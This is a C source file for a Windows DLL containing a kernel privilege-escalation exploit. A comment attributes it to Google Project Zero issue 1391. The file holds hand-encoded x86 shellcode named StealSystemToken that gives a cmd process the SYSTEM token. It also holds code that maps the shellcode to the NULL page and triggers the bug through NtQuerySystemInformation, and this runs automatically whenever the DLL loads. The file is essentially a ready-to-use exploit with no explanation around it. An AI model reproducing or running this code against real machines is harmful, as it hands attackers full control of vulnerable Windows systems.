#include <windows.h>
#include <winternl.h>

const CHAR StealSystemToken[123] = ""
"\x60\x64\x8b\x3d\x24\x01\x00\x00\x8b\xbf\x50\x01\x00\x00\x8b\x8f"
"\xb8\x00\x00\x00\x8b\x09\x8b\x41\xfc\x3d\x04\x00\x00\x00\x75\xf4"
"\x8b\x71\x44\x81\xe6\xf0\xff\xff\xff\x8b\x09\x8b\x81\xc4\x00\x00"
"\x00\x3d\x63\x6d\x64\x2e\x75\xf1\x89\x71\x44\x61\xc7\x43\x04\x00"
"\x00\x00\x00\x64\x8b\x3d\x24\x01\x00\x00\xc7\x87\x3e\x01\x00\x00"
"\x00\x00\x00\x00\xb9\x0c\x00\x00\x00\x31\xc0\x81\xc7\xe8\x01\x00"
"\x00\xf3\xab\x81\xc4\x10\x00\x00\x00\xc9\xc9\xc9\x81\xc4\x08\x00"
"\x00\x00\x5f\x5f\x5e\x5b\x89\xec\x5d\xc3";


VOID Exploit()
{
	/**
	* The POC code is from Google Project-Zero Issue 1391.
	* The bug was reported by Matthew "j00ru" Jurczyk.
	*/
	BYTE Buffer[8];
	DWORD BytesReturned;

	RtlZeroMemory(Buffer, sizeof(Buffer));
	NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)185, Buffer, sizeof(Buffer), &BytesReturned);

	RtlCopyMemory(NULL, StealSystemToken, 122);

	RtlZeroMemory(Buffer, sizeof(Buffer));
	NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)185, Buffer, sizeof(Buffer), &BytesReturned);
}

__declspec(dllexport)
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call) {
		case DLL_PROCESS_ATTACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			Exploit();
			break;
	}
	return TRUE;
}
